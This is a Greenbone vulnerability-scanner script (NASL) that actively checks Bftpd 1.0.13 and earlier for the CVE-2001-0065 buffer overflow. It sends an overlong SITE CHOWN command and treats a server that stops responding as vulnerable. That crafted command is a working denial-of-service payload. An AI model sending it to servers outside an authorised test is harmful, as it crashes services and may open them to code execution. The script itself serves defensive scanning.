CPE = "cpe:/a:bftpd:bftpd";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.146592" );
	script_version( "2021-08-31T13:35:08+0000" );
	script_tag( name: "last_modification", value: "2021-08-31 13:35:08 +0000 (Tue, 31 Aug 2021)" );
	script_tag( name: "creation_date", value: "2021-08-30 14:04:58 +0000 (Mon, 30 Aug 2021)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2001-0065" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "Workaround" );
	script_name( "Bftpd <= 1.0.13 Buffer Overflow Vulnerability - Active Check" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2021 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "gb_bftpd_detect.sc" );
	script_mandatory_keys( "bftpd/detected" );
	script_require_ports( "Services/ftp", 21 );
	script_tag( name: "summary", value: "Bftpd is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Sends a crafted SITE CHOWN command and checks if the server
  still responses." );
	script_tag( name: "insight", value: "A buffer overflow allows remote attackers to cause a denial of
  service (DoS) and possibly execute arbitrary commands via a long SITE CHOWN command." );
	script_tag( name: "impact", value: "Successful exploitation could allow an attacker to crash the FTP
  server or execute arbitrary code on the target machine." );
	script_tag( name: "affected", value: "Bftdp version 1.0.13 and prior." );
	script_tag( name: "solution", value: "See the advisory for a workaround." );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/bugtraq/2000-12/0189.html" );
	exit( 0 );
}
require("host_details.inc.sc");
require("ftp_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "ftp" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, nofork: TRUE )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
creds = ftp_get_kb_creds();
login = creds["login"];
pass = creds["pass"];
if(!ftp_authenticate( socket: soc, user: login, pass: pass )){
	ftp_close( socket: soc );
	exit( 0 );
}
cmd = "SITE CHOWN AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA A\r\n";
send( socket: soc, data: cmd );
ftp_recv_line( socket: soc );
send( socket: soc, data: "HELP\r\n" );
res = ftp_recv_line( socket: soc, retry: 2 );
ftp_close( socket: soc );
if(!res){
	report = "The FTP server did not respond anymore after executing the following command:\n\n" + cmd;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

